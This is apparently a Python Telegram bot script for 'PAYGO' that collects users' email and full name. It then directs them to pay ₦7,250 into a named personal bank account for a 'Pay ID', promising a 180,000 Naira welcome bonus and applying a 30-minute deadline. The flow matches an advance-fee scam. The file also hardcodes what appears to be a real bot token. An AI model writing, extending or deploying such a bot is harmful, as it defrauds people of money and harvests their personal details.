import telebot
from telebot import types
from flask import Flask
from threading import Thread

# === CONFIG ===
BOT_TOKEN = "7643980378:AAGK-G8-iURrpttIyUJGc8bJTxtJNc0dr0w"  # <-- Replace this with your real token

bot = telebot.TeleBot(BOT_TOKEN)
user_data = {}

# === KEEP ALIVE SETUP ===
app = Flask(__name__)  # ✅ This line is important for Render

@app.route('/')
def home():
    return "Bot is alive!"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

# === BOT HANDLERS ===

@bot.message_handler(commands=['start'])
def start(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("💳 Buy Pay ID", "📝 Register")
    markup.row("ℹ️ About", "📢 Join Group", "🆘 Need Help")
    bot.send_message(message.chat.id, "Welcome to *PAYGO Bot*! 👋", parse_mode="Markdown", reply_markup=markup)

# 1. Buy Pay ID
@bot.message_handler(func=lambda m: m.text == "💳 Buy Pay ID")
def ask_email(message):
    bot.send_message(message.chat.id, "📧 Please enter your *email address*:", parse_mode="Markdown")
    bot.register_next_step_handler(message, ask_full_name)

def ask_full_name(message):
    user_data[message.chat.id] = {'email': message.text}
    bot.send_message(message.chat.id, "👤 Now enter your *full name*:", parse_mode="Markdown")
    bot.register_next_step_handler(message, confirm_details)

def confirm_details(message):
    user_data[message.chat.id]['full_name'] = message.text
    email = user_data[message.chat.id]['email']
    full_name = user_data[message.chat.id]['full_name']

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("✅ Continue", callback_data="continue_payment"))

    bot.send_message(message.chat.id,
        f"⚠️ *Alert*\n\nAre you sure all the details you entered are correct?\n\n"
        f"*Email:* {email}\n*Full Name:* {full_name}\n\n"
        "If yes, click on Continue ✅", parse_mode="Markdown", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "continue_payment")
def send_payment_details(call):
    bot.send_message(call.message.chat.id,
        "✅ *Make a one-time payment using the account below* (expires in 30 minutes)\n\n"
        "🔢 *Account Number:* 9127585834\n"
        "*Bank:* PALMPAY LTD\n"
        "*Account Name:* PAYGO-Khalifah Ibrahim (Agent)\n"
        "*Amount:* ₦7,250\n\n"
        "⚠️ *Do not use OPay to make this payment. Use other banks.*\n\n"
        "▶️ After payment, send a screenshot of your payment for fast confirmation.",
        parse_mode="Markdown")
    bot.register_next_step_handler(call.message, after_receipt)

def after_receipt(message):
    if message.content_type == 'photo':
        bot.send_message(message.chat.id, "♻️ *Loading...*\n\nWe will notify you in 20 minutes to confirm your payment.", parse_mode="Markdown")
    else:
        bot.send_message(message.chat.id, "❌ Please send a *photo* of your payment screenshot.", parse_mode="Markdown")
        bot.register_next_step_handler(message, after_receipt)

# 2. Register
@bot.message_handler(func=lambda m: m.text == "📝 Register")
def register(message):
    bot.send_message(message.chat.id,
        "📝 *Register on PayGo website using the link below* 👇👇\n\n"
        "https://paygo-financial-pro.netlify.app", parse_mode="Markdown")

# 3. About
@bot.message_handler(func=lambda m: m.text == "ℹ️ About")
def about(message):
    bot.send_message(message.chat.id,
        "*Welcome to PAYGO!* ✅\n\n"
        "We're excited to introduce you to the ultimate platform for earning opportunities! "
        "Our mission is to empower individuals with financial freedom.\n\n"
        "*Get Started with a Generous Welcome Bonus!*\n"
        "As a new user, you'll receive a welcome bonus of 180,000 Naira, which is yours to keep!\n\n"
        "*Activate Your PAY ID in 3 Easy Steps:*\n"
        "1. Sign up with a valid email address.\n"
        "2. Purchase your unique PAY ID for ₦7,250 on our website.\n"
        "3. Verify your email address to receive your PAY ID code.\n\n"
        "*Join the PAYGO Community Today!*", parse_mode="Markdown")

# 4. Join Group
@bot.message_handler(func=lambda m: m.text == "📢 Join Group")
def join_group(message):
    bot.send_message(message.chat.id,
        "Click on the link below to join the PayGo WhatsApp channel 👇👇\n\n"
        "https://whatsapp.com/channel/0029VbBFTkBLI8YguYWtvH3D")

# 5. Need Help
@bot.message_handler(func=lambda m: m.text == "🆘 Need Help")
def help_link(message):
    bot.send_message(message.chat.id,
        "🆘 Click below to get help on WhatsApp:\nhttps://wa.me/2348037750681")

# === START EVERYTHING ===
keep_alive()
print("✅ Bot is running...")
bot.infinity_polling()
